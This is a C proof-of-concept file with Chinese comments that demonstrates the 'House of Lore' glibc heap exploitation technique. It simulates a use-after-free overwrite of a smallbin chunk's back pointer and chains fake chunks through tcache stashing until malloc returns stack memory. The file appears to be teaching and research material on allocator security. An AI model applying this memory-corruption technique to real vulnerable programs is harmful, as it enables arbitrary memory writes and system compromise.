/*
 * 手法：House of Lore，直接伪造 smallbin 双链，适用于 glibc 2.26～2.42，x86-64。
 *
 * 漏洞模型：UAF 覆盖已进入 smallbin 的 victim->bk。
 * 成功效果：真实 `malloc(0x100)` 返回栈上 fake chunk 的 user 区。
 *
 * 2.26 引入 tcache 后，单纯把 smallbin 尾指向 fake chunk 还不够：
 *   1. 先释放 7 个同尺寸 chunk 填满 tcache，使 victim 进入 unsorted；
 *   2. 把 victim 排入 smallbin，再耗尽 tcache；
 *   3. 第一次 malloc 从 smallbin 取真实 victim，并把后续 fake 双链节点
 *      stash 进 tcache；
 *   4. 第二次 malloc 从 tcache 返回最后一个 fake 节点。
 *
 * 本 PoC 特别避免旧示例的假成功：旧代码即使 p4 仍在堆上，也会用一个
 * 任意跨度 memcpy 直接覆盖函数返回地址。这里直接断言 malloc 返回值就是
 * 预期的栈地址，绝不另写返回地址。
 *
 * 2.43 默认 tcache count 从 7 改为 16，fake 链长度也必须一起变化，请用
 * 2.43 版本请改用本目录的 `poc_2.43.c`。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define REQUEST_SIZE 0x100
#define PHYSICAL_SIZE 0x110
#define TCACHE_COUNT 7

/* glibc 把 fake 节点 stash 进 tcache 前会执行
 * `set_inuse_bit_at_offset(tc_victim, nb)`，即写 fake+0x118。给每个节点
 * 留出完整 0x120 字节，避免像旧 PoC 那样让该写随机落到其他栈变量。
 */
struct fake_chunk {
    uint64_t prev_size;             /* 伪 chunk 起点 +0x00：前一块大小字段。 */
    uint64_t size;                  /* 伪 chunk 起点 +0x08：当前块大小字段。 */
    uint64_t fd;                    /* 伪 chunk 起点 +0x10：fd 字段，也是返回给用户的位置。 */
    uint64_t bk;                    /* 伪 chunk 起点 +0x18：bk 字段，用来串接下一伪节点。 */
    unsigned char padding[0x100];   /* 覆盖至 next chunk 的 size bit 写点 */
};

int main(void)
{
    setbuf(stdout, NULL);

    void *tcache_fill[TCACHE_COUNT];
    struct fake_chunk fake_first __attribute__((aligned(16)));
    struct fake_chunk fake_second __attribute__((aligned(16)));
    struct fake_chunk fake_chain[TCACHE_COUNT] __attribute__((aligned(16)));
    memset(&fake_first, 0, sizeof(fake_first));
    memset(&fake_second, 0, sizeof(fake_second));
    memset(fake_chain, 0, sizeof(fake_chain));

    uint64_t *victim = malloc(REQUEST_SIZE);
    assert(victim != NULL);
    for (int i = 0; i < TCACHE_COUNT; ++i) {
        tcache_fill[i] = malloc(REQUEST_SIZE);
        assert(tcache_fill[i] != NULL);
    }
    void *guard = malloc(0x500);
    assert(guard != NULL);

    /* tcache 满后，victim 的物理 size=0x110，因此 free 进入 unsorted。 */
    for (int i = 0; i < TCACHE_COUNT; ++i)
        free(tcache_fill[i]);
    free(victim);

    /* 较大请求无法使用 victim，会把它从 unsorted 排入 0x110 smallbin。 */
    void *sorter = malloc(0x600);
    assert(sorter != NULL);

    uint64_t victim_chunk = (uint64_t)(victim - 2);

    /* 构造自洽双链：摘 victim 时只检查 fake_first.fd == victim_chunk；
       后续 stashing 每轮沿当前节点的 bk 继续走，并把 bck->fd 写回 bin。 */
    fake_first.fd = victim_chunk;
    fake_first.bk = (uint64_t)&fake_second;
    fake_second.fd = (uint64_t)&fake_first;
    fake_second.bk = (uint64_t)&fake_chain[0];
    for (int i = 0; i + 1 < TCACHE_COUNT; ++i)
        fake_chain[i].bk = (uint64_t)&fake_chain[i + 1];

    /* ---------------- 漏洞模拟：UAF 覆盖 smallbin victim->bk。 ---------------- */
    victim[1] = (uint64_t)&fake_first;

    /* 耗尽原有 tcache，迫使下一次请求进入 smallbin 路径。 */
    for (int i = 0; i < TCACHE_COUNT; ++i)
        assert(malloc(REQUEST_SIZE) != NULL);

    void *real_result = malloc(REQUEST_SIZE);
    assert(real_result == victim);

    /* stashing 顺序是 fake_first、fake_second、fake_chain[0]...；共填 7 个，
       所以 LIFO 头是 fake_chain[4] 的 user 区。 */
    void *expected = (char *)&fake_chain[TCACHE_COUNT - 3] + 0x10;
    void *fake_result = malloc(REQUEST_SIZE);

    assert(fake_result == expected);

    strcpy(fake_result, "LORE_ON_STACK");
    assert(strcmp((char *)expected, "LORE_ON_STACK") == 0);
    puts("[+] Lore：栈 smallbin 伪块命中");
    return 0;
}
